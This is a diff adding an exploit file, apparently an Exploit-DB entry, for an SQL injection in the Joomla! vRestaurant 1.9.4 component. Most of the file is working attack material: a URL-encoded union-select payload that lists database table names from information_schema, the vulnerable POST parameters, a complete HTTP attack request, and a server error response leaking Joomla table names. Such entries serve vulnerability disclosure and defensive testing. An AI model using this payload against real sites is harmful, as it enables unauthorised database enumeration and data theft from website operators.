@@ -1,0 +1,47 @@
+# Exploit Title: Joomla! Component vRestaurant 1.9.4 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-23
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://wdmtech.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/vertical-markets/food-a-beverage/vrestaurant/
+# Version: 1.9.4
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/menu-listing-layout/menuitems
+# 
+
+%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%28%53%45%4c%45%43%54%28%40%78%29%46%52%4f%4d%28%53%45%4c%45%43%54%28%40%78%3a%3d%30%78%30%30%29%2c%28%40%4e%52%3a%3d%30%29%2c%28%53%45%4c%45%43%54%28%30%29%46%52%4f%4d%28%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%29%57%48%45%52%45%28%54%41%42%4c%45%5f%53%43%48%45%4d%41%21%3d%30%78%36%39%36%65%36%36%36%66%37%32%36%64%36%31%37%34%36%39%36%66%36%65%35%66%37%33%36%33%36%38%36%35%36%64%36%31%29%41%4e%44%28%30%78%30%30%29%49%4e%28%40%78%3a%3d%43%4f%4e%43%41%54%28%40%78%2c%4c%50%41%44%28%40%4e%52%3a%3d%40%4e%52%25%32%62%31%2c%34%2c%30%78%33%30%29%2c%30%78%33%61%32%30%2c%74%61%62%6c%65%5f%6e%61%6d%65%2c%30%78%33%63%36%32%37%32%33%65%29%29%29%29%78%29%2d%2d%20%2d
+
+# keysearch=[SQL]
+# categories[]=[SQL]
+# min=[SQL]
+# max=[SQL]
+
+POST /[PATH]/menu-listing-layout/menuitems HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 322
+Cookie: 1b9dcd66a46474552f38b0164f24ac07=1dc22d621aab1d9d01c05431e9b453b3
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+csmodid=236&Itemid=303&keysearch=' union select (SELECT(@x)FROM(SELECT(@x: =0x00),(@NR
+HTTP/1.1 500 You have an error in your SQL .....#__associations<br>0007: #__banner_clients<br>0008: #__banner_tracks<br>0009: #__banners<br>0010:X-Powered-By: PHP/5.6.16
+Date: Tue, 22 Jan 2019 19:04:29 GMT
+Server: Apache
+X-Logged-In: False
+P3P: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"
+Cache-Control: no-cache
+Pragma: no-cache
+Vary: Accept-Encoding
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
